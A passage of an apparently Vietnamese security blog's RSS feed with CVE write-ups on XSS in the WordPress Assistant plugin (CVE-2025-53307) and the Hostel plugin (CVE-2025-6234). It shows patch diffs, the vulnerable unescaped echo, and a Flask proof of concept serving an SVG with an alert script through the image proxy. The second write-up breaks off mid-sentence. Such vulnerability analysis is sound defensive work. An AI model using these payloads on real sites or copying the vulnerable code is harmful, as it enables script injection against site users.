9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/patch_diff.png&#34;&#xA;    alt=&#34;Diff giữa bản lỗi và bản vá&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff giữa bản lỗi và bản vá&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Trong trường hợp này, sự khác biệt giữa 2 phiên bản khá nhiều, để thuận lợi cho việc truy vết, ta có thể xem &lt;a href=&#34;https://wordpress.org/plugins/assistant/#developers&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;change log&lt;/a&gt; để biết bản vá lỗ hổng XSS ở đâu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Changelog&#xA;1.5.3 ( 2025-09-08 )&#xA;&#xA;- Changes to support the integration of Assistant in Beaver Builder version 2.10&#xA;- Fixed dark mode issues on the Home app and sidebar.&#xA;- Security: Fixed a potential XSS vulnerability in the &amp;#34;image proxy&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Lỗ hỗng nằm trong file &lt;strong&gt;backend/src/Hooks/ImageProxy.php&lt;/strong&gt;, ta quan sát sự khác biệt của 2 phiên bản:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/patch_diff1.png&#34;&#xA;    alt=&#34;Sự khác biệt trong hàm render_image của ImageProxy.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Sự khác biệt trong hàm render_image của ImageProxy.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Sự thay đổi xảy ra ở hàm &lt;code&gt;render_image&lt;/code&gt; với chức năng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nhận tham số url từ query string &lt;code&gt;($_GET[&#39;url&#39;])&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Gửi request từ server đến URL đó để tải nội dung.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Chống &lt;strong&gt;ssrf&lt;/strong&gt; bằng &lt;code&gt;wp_safe_remote_get&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu nội dung có header &lt;strong&gt;Content-Type&lt;/strong&gt; bắt đầu bằng &lt;code&gt;image/&lt;/code&gt;, thì:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Gửi lại header &lt;strong&gt;Content-Type&lt;/strong&gt; đó cho client.&lt;/li&gt;&#xA;&lt;li&gt;In (echo) toàn bộ nội dung file ra cho trình duyệt.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Trình duyệt hiển thị hình ảnh &lt;strong&gt;không phải trực tiếp từ nguồn gốc mà thông qua server WordPress&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;SVG cũng có &lt;strong&gt;Content-Type&lt;/strong&gt; bắt đầu bằng &lt;code&gt;image/&lt;/code&gt; và có thể chứa mã JavaScript bên trong =&amp;gt; XSS có thể xảy ra.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Bản vá đã thêm một lớp kiểm tra &lt;strong&gt;MIME type&lt;/strong&gt; thực sự của file để tránh kịch bản XSS bằng SVG hay file giả mạo.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$filesystem = self::filesystem();&#xA;$tmpfile    = tempnam( &amp;#39;/tmp&amp;#39;, &amp;#39;assistant&amp;#39; );&#xA;$filesystem-&amp;gt;put_contents( $tmpfile, $body );&#xA;$validimage = wp_get_image_mime( $tmpfile );&#xA;$filesystem-&amp;gt;delete( $tmpfile );&#xA;&#xA;if ( ! $validimage ) {&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.2/src/wp-includes/functions.php#L3330-L3417&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_get_image_mime()&lt;/code&gt;&lt;/a&gt; sử dụng hàm xử lý ảnh nội bộ (dựa trên dữ liệu binary của file) để xác định MIME thực sự.&lt;/p&gt;&#xA;&lt;p&gt;Nếu kết quả không phải là ảnh hợp lệ =&amp;gt; return &lt;strong&gt;false&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong &lt;code&gt;__construct&lt;/code&gt; của class &lt;code&gt;ImageProxy&lt;/code&gt;, phương thức &lt;code&gt;render_image()&lt;/code&gt; được gọi thông qua callback của action hook &lt;code&gt;&#39;init&#39;&lt;/code&gt;. Hook &lt;code&gt;&#39;init&#39;&lt;/code&gt; được thực thi rất sớm trong quá trình load WordPress, sau khi các đối tượng core được khởi tạo nhưng trước khi gửi output ra trình duyệt.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;render_image&lt;/code&gt; chỉ được gọi khi người dùng hiện tại có quyền chỉnh sửa bài viết của người khác và tham số &lt;code&gt;$_GET[&#39;fl_asst_image_proxy&#39;]&lt;/code&gt; tồn tại.&lt;/p&gt;&#xA;&lt;p&gt;👉 Khi truy cập &lt;code&gt;/wp-admin/?fl_asst_image_proxy=value1&amp;amp;url=http://yoursite/image-path&lt;/code&gt; thì &lt;code&gt;render_image&lt;/code&gt; sẽ được gọi và trả về nội dung hình ảnh cho trình duyệt hiển thị.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo 1 trang &lt;a href=&#34;https://github.com/w41bu1/w41test&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;web&lt;/a&gt; đơn giản trả về nội dung SVG chứa XSS payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, Response&#xA;&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/&amp;#39;)&#xA;def home():&#xA;    return &amp;#39;Hello, World!&amp;#39;&#xA;&#xA;@app.route(&amp;#39;/svg&amp;#39;)&#xA;def about():&#xA;    svg = &amp;#34;&amp;#34;&amp;#34;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&#xA;    &amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;        &amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&#xA;    &amp;lt;/svg&amp;gt;&amp;#34;&amp;#34;&amp;#34;&#xA;    return Response(svg, mimetype=&amp;#34;image/svg&amp;#43;xml&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gửi request chứa &lt;strong&gt;url param&lt;/strong&gt; trỏ đến &lt;code&gt;https://yoursite/svg&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/?fl_asst_image_proxy=abc&amp;amp;url=https://yoursite/svg&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Thành công với &lt;code&gt;Unauthenticated&lt;/code&gt; vì chỉ cần người dùng có quyền, khi truy cập url =&amp;gt; XSS xảy ra trên trình duyệt của nạn nhân. Attacker không cần đăng nhập.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/detect.png&#34;&#xA;    alt=&#34;SVG chứa XSS payload được hiển thị qua image proxy&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;SVG chứa XSS payload được hiển thị qua image proxy&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-53307&lt;/strong&gt; trong plugin WordPress Assistant (&lt;strong&gt;&amp;lt;= v1.5.2&lt;/strong&gt;) cho phép XSS thông qua &lt;code&gt;render_image()&lt;/code&gt; vì không kiểm tra &lt;strong&gt;MIME type&lt;/strong&gt; thực của file. Bản vá &lt;strong&gt;v1.5.3&lt;/strong&gt; đã khắc phục bằng cách xác thực nội dung file trước khi trả về trình duyệt.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Không tin cậy vào &lt;strong&gt;Content-Type header&lt;/strong&gt; từ &lt;strong&gt;HTTP response&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Luôn xác thực &lt;strong&gt;MIME type&lt;/strong&gt; thực sự của file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/assistant/vulnerability/wordpress-assistant-plugin-1-5-2-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WordPress Assistant Plugin &amp;lt;= 1.5.2 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6234 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-02-cve-2025-6234/</link>
      <pubDate>Thu, 02 Oct 2025 20:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-02-cve-2025-6234/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Hostel&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;1.1.5.8&lt;/strong&gt;. Kẻ tấn công có thể lợi dụng lỗ hổng này để tấn công người dùng có quyền cao như &lt;strong&gt;admin&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6234&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6234&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hostel/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt; 1.1.5.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Hostel Plugin&lt;/strong&gt;:  v1.1.5.7(vul) và v1.1.5.8(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguyên nhân gốc rễ do không thực hiện &lt;strong&gt;sanitize&lt;/strong&gt; (làm sạch dữ liệu) và &lt;strong&gt;escape&lt;/strong&gt; (mã hóa dữ liệu đầu ra) đối với một tham số trước khi phản hồi lại trên trang, dẫn đến lỗ hổng &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở 2 file &lt;strong&gt;views/bookings.html.php&lt;/strong&gt; và &lt;strong&gt;controllers/bookings.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;File views/bookings.html.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;p align=&amp;#34;center&amp;#34;&amp;gt;&#xA;    &amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset - $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[previous page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt; &#xA;    &amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset &amp;#43; $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo @$_GET[&amp;#39;ob&amp;#39;]?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[next page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt;&#x9;&#xA;&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tham số &lt;code&gt;ob&lt;/code&gt; được lấy trực tiếp từ &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; và echo ra HTML attribute mà &lt;strong&gt;không có bất kì xử lý escape&lt;/strong&gt; nào. Điều này dẫn đến nguy cơ &lt;strong&gt;Reflected XSS (Cross-Site Scripting)&lt;/strong&gt;, vì attacker có thể chèn payload vào query string,&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;p align=&amp;#34;center&amp;#34;&amp;gt;&#xA;    &amp;lt;?php if($offset &amp;gt; 0):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset - $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo esc_attr($_GET[&amp;#39;ob&amp;#39;] ?? &amp;#39;&amp;#39;)?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[previous page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt; &#xA;    &amp;lt;?php if($count &amp;gt; ($page_limit &amp;#43; $offset)):?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;admin.php?page=wphostel_bookings&amp;amp;type=&amp;lt;?php echo $type?&amp;gt;&amp;amp;offset=&amp;lt;?php echo $offset &amp;#43; $page_limit?&amp;gt;&amp;amp;ob=&amp;lt;?php echo esc_attr($_GET[&amp;#39;ob&amp;#39;] ?? &amp;#39;&amp;#39;)?&amp;gt;&amp;#34;&amp;gt;&amp;lt;?php _e(&amp;#39;[next page]&amp;#39;, &amp;#39;wphostel&amp;#39;)?&amp;gt;&amp;lt;/a&amp;gt;&#xA;    &amp;lt;?php endif;?&amp;gt;&#x9;&#xA;&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã sử dụng hàm &lt;code&gt;esc_attr()&lt;/code&gt; để encode &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; thành dạng an toàn trước khi echo ra HTML attribute.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-02-cve-2025-6234/diff_code.png&#34;&#xA;    alt=&#34;Diff giữa code dễ bị lỗi và code đã vá&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff giữa code dễ bị lỗi và code đã vá&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Source: &lt;code&gt;$_GET[&#39;ob&#39;]&lt;/code&gt; là dữ liệu nhập từ &lt;strong&gt;client (URL query string)&lt;/strong&gt;, attacker có thể kiểm soát hoàn toàn.&lt;/li&gt;&#xA;&lt;li&gt;Sink: echo trong &lt;strong&gt;HTML attribute&lt;/strong&gt; &lt;code&gt;ob=&amp;lt;?php echo 